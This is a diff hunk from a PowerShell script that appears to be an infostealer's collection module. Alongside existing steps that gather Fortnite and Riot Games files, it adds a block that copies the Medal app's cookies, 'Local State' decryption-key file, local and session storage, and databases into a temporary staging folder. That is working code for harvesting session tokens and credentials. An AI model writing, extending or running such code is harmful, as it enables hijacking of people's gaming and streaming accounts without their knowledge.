@@ -659,6 +659,17 @@ if ([System.IO.File]::Exists("$env:appdata/../Local/FortniteGame/Saved/Logs/Fort
 	Copy-Item "$env:appdata/../Local/FortniteGame/Saved/Logs/FortniteLauncher.log" "$env:tmp/$FolderName/Gaming/Fortnite/FortniteLauncher.log"
 }
 
+# Medal
+if (Test-Path "$env:appdata/Medal" -PathType Any) {
+	New-Item -Path $env:tmp/$FolderName/Gaming/Medal -ItemType Directory
+	Copy-Item "$env:appdata\Medal\Cookies" "$env:tmp/$FolderName/Gaming/Medal/Cookies"
+	Copy-Item "$env:appdata\Medal\Local State" "$env:tmp/$FolderName/Gaming/Medal/Local State"
+	Copy-Item "$env:appdata\Medal\Preferences" "$env:tmp/$FolderName/Gaming/Medal/Preferences"
+	Copy-Item "$env:appdata\Medal\Local Storage\leveldb" "$env:tmp/$FolderName/Gaming/Medal/Local Storage/leveldb" -Recurse
+	Copy-Item "$env:appdata\Medal\Session Storage" "$env:tmp/$FolderName/Gaming/Medal/Session Storage" -Recurse
+	Copy-Item "$env:appdata\Medal\databases" "$env:tmp/$FolderName/Gaming/Medal/databases" -Recurse
+}
+
 # RiotGames - Folders
 if (Test-Path "$env:appdata/../Local/Riot Games" -PathType Any) {
 	New-Item -Path "$env:tmp/$FolderName/Gaming/Riot Games" -ItemType Directory
